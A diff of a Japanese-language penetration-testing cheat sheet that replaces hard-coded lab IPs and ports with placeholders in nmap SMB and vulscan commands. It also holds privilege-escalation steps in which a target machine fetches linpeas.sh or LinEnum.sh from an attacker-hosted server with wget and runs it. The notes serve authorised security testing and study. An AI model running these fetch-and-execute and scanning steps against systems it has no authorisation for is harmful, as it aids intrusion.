@@ -145,7 +145,7 @@ docker inspect --format '{{ .NetworkSettings.IPAddress }}' <C-NAME>
 .SMBの例
 ----
 https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b
-nmap -sC -p 139,445 -sV 10.10.65.189
+nmap -sC -p 139,445 -sV [TargetIP]
 ----
 
 === CVEのチェック
@@ -153,7 +153,7 @@ nmap -sC -p 139,445 -sV 10.10.65.189
 ----
 git clone https://github.com/scipag/vulscan scipag_vulscan
 ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
-nmap -sV -p 22,80,81,82,83,9999 --script=vulscan/vulscan.nse www.example.com 10.10.192.87
+nmap -sV -p [TargetPort] --script=vulscan/vulscan.nse www.example.com [TargetIP]
 ----
 
 === ログイン施行
@@ -341,11 +341,11 @@ chmod 600 id_rsa
 # 攻撃者側
 cd /var/tmp
 wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
-python -m SimpleHTTPServer 1234
+python -m SimpleHTTPServer [MyHostPort]
 
 # ターゲット側 
 cd /var/tmp
-wget http://[MyHostIP]:1234/linpeas.sh
+wget http://[MyHostIP]:[MyHostPort]/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ----
@@ -356,12 +356,12 @@ chmod +x linpeas.sh
 # 攻撃者側
 cd /var/tmp
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-python -m SimpleHTTPServer 1234
+python -m SimpleHTTPServer [MyHostPort]
 
 # ターゲット側
 cd /var/tmp
 which wget
-wget [MyHostIP]:1234/LinEnum.sh
+wget [MyHostIP]:[MyHostPort]/LinEnum.sh
 chmod +x LinEnum.sh
 ./LinEnum.sh
 ----
